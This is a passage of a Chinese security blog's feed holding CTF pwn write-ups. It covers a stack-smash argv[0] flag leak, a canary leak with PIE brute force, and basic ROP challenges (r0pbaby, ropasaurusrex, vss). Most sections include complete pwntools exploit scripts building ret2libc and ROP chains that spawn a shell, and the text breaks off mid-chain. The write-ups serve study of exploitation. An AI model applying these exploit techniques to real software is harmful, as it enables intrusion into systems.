class="string">'execve'</span>])</span><br><span class="line">payload3 += <span class="string">'d'</span> * (<span class="number">80</span> - len(payload3))</span><br><span class="line">payload3 += p64(stack_addr - <span class="number">0x30</span>)</span><br><span class="line">payload3 += p64(leave_ret_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">pause()</span><br><span class="line">io.send(payload3)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>里面比较坑的地方有两个，一个是我们的输入不能带<code>\n</code>回车，因为这个回车会覆盖掉<code>rbp</code>最后的值。。这样我们就无法得到正确的值。另外一个是pwntools里面的libc设置，如果设置了libc的address，那么我们在使用libc进行搜索的时候就不用额外再加libc的基地址，因为里面已经自动帮你加上了。但是没有使用libc符号或者搜索的地址还是需要手动增加libc的基地址值。</p><h2 id="readme"><a href="#readme" class="headerlink" title="readme"></a>readme</h2><p>一道神奇的题目，里面有一个循环会覆盖flag的内容。同时文件开启了canary和堆栈执行保护。这里有一个有趣的利用思路，那就是stack smash，恰恰利用canary的check机制，它在check失败之后会打印出<code>argv[0]</code>的字符串，如果能覆盖成其他地址，这里就能够利用来泄露内存数据。而这道题目的flag已经在一开始就存进了内存中，同时由于<code>.bss</code>节的特性，ELF文件在执行的时候，它会被映射两次，所以我们只需要寻找另外一处没有被覆盖掉的内容地址填入<code>argv[0]</code>的地址处，就能够get flag。</p><img src="/2019/09/14/fancy-rop-practice/3.png"><p>刚好这里有一个溢出漏洞可以利用，那么先来看看<code>argv[0]</code>的地址。</p><img src="/2019/09/14/fancy-rop-practice/4.png"><p>在这里能够很明显的看到程序名，而这里一定就是<code>argv[0]</code>的地址，0x7fffffffdc78(大雾？)。这里的地址指向另外一个地址，而那个地址才是存储着字符串的指针的值，所以一开始我还出错了，最后需要覆盖的地址为0x7fffffffdd48。接下来只需要确定出我们的输入的地址，就能控制溢出的字节数。</p><img src="/2019/09/14/fancy-rop-practice/5.png"><p>看到我们的<code>rsi</code>和<code>rsp</code>的值都是0x7fffffffdb30，说明接下来gets的输入会写入这里。接下来就是需要读出来的flag地址了。</p><img src="/2019/09/14/fancy-rop-practice/6.png"><p>我在覆盖的flag中填入的aa，通过搜索这个字符串找到相应的地址，这是第一个映射地址，通过IDA我们能知道flag的样子为<code>32C3...</code>，所有搜索这个就能得到第二个flag的地址。</p><img src="/2019/09/14/fancy-rop-practice/7.png"><p>这里看到另外一个完整的flag地址为0x400d20，通过一个栈溢出来覆盖<code>argv[0]</code>的地址为flag的地址，这样溢出之后的check失败就能把flag打印出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># This exploit template was generated via:</span></span><br><span class="line"><span class="comment"># $ pwn template readme.bin</span></span><br><span class="line"><span class="comment"># Author: hurricane618</span></span><br><span class="line"><span class="comment"># E-mail: hurricane618@hotmail.com</span></span><br><span class="line"><span class="comment"># Website: hurricane618.me</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = ELF(<span class="string">'./'</span> + <span class="string">'readme.bin'</span>)</span><br><span class="line">context.binary = <span class="string">'./'</span> + <span class="string">'readme.bin'</span></span><br><span class="line">libc = exe.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    No RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="comment"># FORTIFY:  Enabled</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'DEBUG'</span>]:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(exe.path)</span><br><span class="line"></span><br><span class="line">argv_addr = <span class="number">0x7fffffffdd48</span></span><br><span class="line">stack_addr = <span class="number">0x7fffffffdb30</span></span><br><span class="line">flag_addr = <span class="number">0x400d20</span></span><br><span class="line">payload = <span class="string">'a'</span> * (argv_addr - stack_addr)</span><br><span class="line">payload += p64(flag_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'name? '</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">'flag: '</span>)</span><br><span class="line">io.sendline(<span class="string">'bb'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><img src="/2019/09/14/fancy-rop-practice/8.png"><p>最后从stack smash的check中get flag信息，如果是在服务器上就能拿到真正的flag。这道题也解决了我的一个疑惑，虽然地址不一样，但是偏移是一样的，所以我们找到地址之后计算需要覆盖的长度也是一样的，同时<code>.bss</code>节的映射又是不变的，这样就能稳定的覆盖成另外一个flag的地址。</p><h2 id="babypie"><a href="#babypie" class="headerlink" title="babypie"></a>babypie</h2><p>一道安恒的月赛题目，题目中有两次输入，第一次能输入0x30，能够刚好溢出8个字节，然后第二次能输入0x60，都写在同一段缓冲区中。程序开启了canary，PIE，NX等等保护，所以第一步需要先泄露出canary的值。</p><p>这里利用了之前的trick，由于读入数据是使用的read并不会有<code>\0</code>在末尾，由于canary的最低位为0，这样我们多覆盖一个字节的数据，让printf直接把canary的值打印出来。</p><p>获取到canary之后，再次观察程序，发现有留有getshell的函数，那题目就简单很多了。这里如果能修改返回地址为函数地址就能getshell。但是程序开了PIE怎么办？？？</p><p>不用怕，PIE的随机化不会影响低12bit的地址，这里只需要暴力测试地址就很有可能得到正确的地址。只是在程序中有4bit在变化，getshell的地址为<code>a3e</code>，由于还有1bit是不能确定的，所以我们直接覆盖成<code>0a3e</code>来碰运气即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># This exploit template was generated via:</span></span><br><span class="line"><span class="comment"># $ pwn template babypie</span></span><br><span class="line"><span class="comment"># Author: hurricane618</span></span><br><span class="line"><span class="comment"># E-mail: hurricane618@hotmail.com</span></span><br><span class="line"><span class="comment"># Website: hurricane618.me</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = ELF(<span class="string">'./'</span> + <span class="string">'babypie'</span>)</span><br><span class="line">context.binary = <span class="string">'./'</span> + <span class="string">'babypie'</span></span><br><span class="line">libc = exe.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'DEBUG'</span>]:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#if args['REMOTE']:</span></span><br><span class="line"><span class="comment">#    io = remote()</span></span><br><span class="line"><span class="comment">#else:</span></span><br><span class="line"><span class="comment">#    io = process(exe.path)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = process(exe.path)</span><br><span class="line">        io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">        payload1 = <span class="string">'a'</span> * (<span class="number">0x28</span> + <span class="number">1</span>)</span><br><span class="line">        io.send(payload1)</span><br><span class="line"></span><br><span class="line">        io.recvuntil(<span class="string">'a'</span> * <span class="number">0x29</span>)</span><br><span class="line">        <span class="comment">#canary = u64(io.recv(7).rjust(8, '\0'))</span></span><br><span class="line">        canary = u64(<span class="string">'\0'</span> + io.recv(<span class="number">7</span>))</span><br><span class="line">        success(<span class="string">'canary: '</span> + hex(canary))</span><br><span class="line"></span><br><span class="line">        io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">        payload2 = <span class="string">'a'</span> * <span class="number">0x28</span></span><br><span class="line">        payload2 += p64(canary)</span><br><span class="line">        payload2 += <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line">        payload2 += <span class="string">'\x3e\x0a'</span></span><br><span class="line">        io.send(payload2)</span><br><span class="line"></span><br><span class="line">        io.interactive()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">print</span> e</span><br></pre></td></tr></table></figure><p>这里要注意ljust和rjust是左对齐和右对齐，一开始没有弄清楚。。。左对齐是在末尾填充，右对齐是在头部填充。</p><h2 id="chess-未解出"><a href="#chess-未解出" class="headerlink" title="chess(未解出)"></a>chess(未解出)</h2><p>先检查安全选项，开启了NX和PIE，不能写shellcode了。发现是一个下棋的游戏，然后里面通过输入字母数字来移动，每次移动都会打印一次。</p><p>然而搜到的韩文解法肯本看不懂。。。这里就记录一下了，期望以后可以做出来</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://23r3f.github.io/2018/12/03/2018-12-3-pwndbg%E7%94%A8%E6%B3%95/" target="_blank" rel="noopener">https://23r3f.github.io/2018/12/03/2018-12-3-pwndbg%E7%94%A8%E6%B3%95/</a></p><p><a href="http://blog.naver.com/PostView.nhn?blogId=mathboy7&amp;logNo=220335795719&amp;categoryNo=0&amp;parentCategoryNo=0&amp;viewDate=&amp;currentPage=1&amp;postListTopCurrentPage=1" target="_blank" rel="noopener">http://blog.naver.com/PostView.nhn?blogId=mathboy7&amp;logNo=220335795719&amp;categoryNo=0&amp;parentCategoryNo=0&amp;viewDate=&amp;currentPage=1&amp;postListTopCurrentPage=1</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;继续进行着栈溢出的练习，这次是参考了ctf-wiki上面的演示题目，在复现过程中的一些记录。&lt;/p&gt;
&lt;h2 id=&quot;over&quot;&gt;&lt;a href=&quot;#over&quot; class=&quot;headerlink&quot; title=&quot;over&quot;&gt;&lt;/a&gt;over&lt;/h2&gt;&lt;p&gt;安恒月赛的题目，
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="ROP" scheme="https://hurricane618.me/tags/ROP/"/>
    
      <category term="stackoverflow" scheme="https://hurricane618.me/tags/stackoverflow/"/>
    
  </entry>
  
  <entry>
    <title>基础ROP学习</title>
    <link href="https://hurricane618.me/2019/07/26/basic-rop-practice/"/>
    <id>https://hurricane618.me/2019/07/26/basic-rop-practice/</id>
    <published>2019-07-26T07:11:33.000Z</published>
    <updated>2019-07-26T07:48:58.961Z</updated>
    
    <content type="html"><![CDATA[<p>最近开始入门pwn，在白泽新手oj那里学了一波之后开始自己学剩下的内容。看到atum大佬推荐的三道基础ROP题目，就练习一下，学习思路总结经验。在网上找题的过程中发现vss基本上绝迹了。。。辛苦一番之后终于找到，为了后面的人也能快速找到题目我就把三道题一起上传了。</p><p><a href="http://hurricane618.me/resource/basic-rop/vss">http://hurricane618.me/resource/basic-rop/vss</a></p><p><a href="http://hurricane618.me/resource/basic-rop/ropasaurusrex">http://hurricane618.me/resource/basic-rop/ropasaurusrex</a></p><p><a href="http://hurricane618.me/resource/basic-rop/r0pbaby">http://hurricane618.me/resource/basic-rop/r0pbaby</a></p><h2 id="r0pbaby"><a href="#r0pbaby" class="headerlink" title="r0pbaby"></a>r0pbaby</h2><p>一道强化版的入门栈溢出，其中比较有意思的一点是栈溢出需要至少0x440才行，然而这个值为1088，但是题目里面限制了长度最大为1024，所以我们可以知道这里不能用填充数据的方法来实现控制流的劫持。（大雾？）</p><img src="/2019/07/26/basic-rop-practice/1.jpg"><p>看了一眼wp才发现……我就是一个sb</p><img src="/2019/07/26/basic-rop-practice/2.jpg"><p>在上图我们可以看到如果超过限制的1024就会输出非法提示，在另外一边它会逐字节的读入字符并把它们顺序的保存进<code>nptr</code>这个变量中，在最后使用<code>memcpy</code>函数把保存的字符串复制到<code>savedregs</code>这个标记中，我们双击这个标记就可以跳转到栈位置中。</p><img src="/2019/07/26/basic-rop-practice/3.jpg"><p>而这个位置刚好就是<code>old rbp</code>的值，所以我们只需要覆盖掉8个字节就能溢出。溢出之后接上gadget和参数以及system的地址就能完成操作。</p><p>这里需要注意的一点是，由于程序开启了地址随机化，所以不能找程序中的gadget，只能找libc中的gadget，因为libc的基地址是可以算出来的，所以最终也是能算出libc中的gadget。</p><p>就这样再libc中找到gadget和binsh字符串，混合着写出payload，这里还需要注意的一点是libc的地址不等于libc的基地址，基地址是用来推算libc函数用的起始地址，libc的地址应该是libc的加载地址，中间应该还有一些其他的数据。</p><p>最后还有一点，就是这种有一直循环的程序运行时，我们getshell之后，相当于是开了一个子进程，需要将原来的进程退掉，才能进入shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./r0pbaby"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">rdi_ret_offset = <span class="number">0x21102</span></span><br><span class="line">binsh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh.recvuntil(": ")</span></span><br><span class="line"><span class="comment">#sh.sendline("1")</span></span><br><span class="line"><span class="comment">#sh.recvuntil(": ")</span></span><br><span class="line"><span class="comment">#libc_addr = int(sh.recvuntil("\n").strip(), 16)</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">sh.sendline(<span class="string">"system"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">system_addr = int(sh.recvuntil(<span class="string">"\n"</span>).strip(), <span class="number">16</span>)</span><br><span class="line">libc_addr = system_addr - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">rdi_ret = libc_addr + rdi_ret_offset</span><br><span class="line">binsh = libc_addr + binsh_offset</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">sh.sendline(<span class="string">"33"</span>)</span><br><span class="line">payload = <span class="number">0x8</span>*<span class="string">'a'</span></span><br><span class="line">payload += p64(rdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"><span class="comment">#print sh.pid</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">"4"</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ropasaurusrex"><a href="#ropasaurusrex" class="headerlink" title="ropasaurusrex"></a>ropasaurusrex</h2><p>很明显的栈溢出，查看检查只有堆栈执行保护。</p><img src="/2019/07/26/basic-rop-practice/4.jpg"><p>简单观察程序，发现没有system，只有read和write，也没有<code>/bin/sh</code>，32位的小端程序。思路还是比较清晰的，这个和之前白泽的题目比较类似，需要使用write把地址泄露出来，然后计算得到libc基地址，在这之后就有两种思路了。</p><p>第一种，寻找libc上面的<code>/bin/sh</code>。第二种，通过read写入<code>/bin/sh</code>在bss段中。最后都要使用计算出的system来执行。</p><p>所以，我这里为了不那么麻烦，就直接使用libc里面的字符串了。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">"./ropasaurusrex"</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"/lib32/libc.so.6"</span>)</span><br><span class="line">program = ELF(<span class="string">"./ropasaurusrex"</span>)</span><br><span class="line">got_write = program.got[<span class="string">'write'</span>]</span><br><span class="line">plt_write = program.symbols[<span class="string">'write'</span>]</span><br><span class="line">plt_read = program.symbols[<span class="string">'read'</span>]</span><br><span class="line">main_addr = <span class="number">0x0804841d</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="number">0x88</span>*<span class="string">'a'</span> + <span class="number">4</span>*<span class="string">'b'</span></span><br><span class="line">payload1 += p32(plt_write)</span><br><span class="line">payload1 += p32(main_addr)</span><br><span class="line">payload1 += p32(<span class="number">1</span>)</span><br><span class="line">payload1 += p32(got_write)</span><br><span class="line">payload1 += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">write_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload2 = <span class="number">0x88</span>*<span class="string">'a'</span> + <span class="number">4</span>*<span class="string">'b'</span></span><br><span class="line">payload2 += p32(system_addr)</span><br><span class="line">payload2 += p32(<span class="number">0</span>)</span><br><span class="line">payload2 += p32(binsh)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload2)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>在做题的过程中发现了一个小问题，也就是main的符号也不是每次都有的，所以在使用的过程中最好还是直接写main函数的地址比较好。</p><h2 id="vss"><a href="#vss" class="headerlink" title="vss"></a>vss</h2><p>64位程序，同时程序保护只有堆栈不可执行。静态编译果然有点小麻烦，并且所有的符号还被去除了。</p><p>这里通过经验可以知道start的程序入口处最后的call会调用<code>__libc_start_main</code>，同时上面的offset处一定是main函数。找到之后按n键可以修改函数名，这样就方便很多了。也可以通过搜索字符串，然后查看引用地址来锁定main函数。</p><img src="/2019/07/26/basic-rop-practice/5.jpg"><p>随后通过汇编中的call，来定位调用函数的地址，通过eax的赋值和旁边syscall的提示来把推断具体的函数。</p><p>在理清楚程序之后，简单来说程序会先读入0x400字节大小的数据进入缓冲区会判断前两个字符是否为<code>py</code>，然后进入另外一个函数中，在这个函数中会将缓冲区其中的前0x50个字节的数据读入另外一个只有0x40的缓冲区中。这就是很明显的缓冲区溢出，但是有一点我们的溢出数据只有0x10，也就是说除了覆盖rbp之外，就只能覆盖掉ret地址。</p><p>这里用到了<code>stack pivot</code>，就是劫持栈指针到其他我们可控的地方这样就能执行我们想要的指令。这里虽然第二个函数的缓冲区不够用，但是我们的第一个缓冲区能够输入足够多的数据，所以我们可以找到一个增加栈指针的gadget让返回之后的rsp能够指向我们的rop链。</p><p>这里是找到了一个可以增加0x58 rsp的gadget，这样我们填充前0x50的数据之后还有剩余，再填充8个字节的数据之后，再接上rop链就能像前面一样的getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000401937</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006c4080</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046f208</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">'/bin//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046b8d1</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000401937</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006c4088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000041bd1f</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046b8d1</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000401823</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006c4080</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000401937</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006c4088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000043ae05</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006c4088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000041bd1f</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; 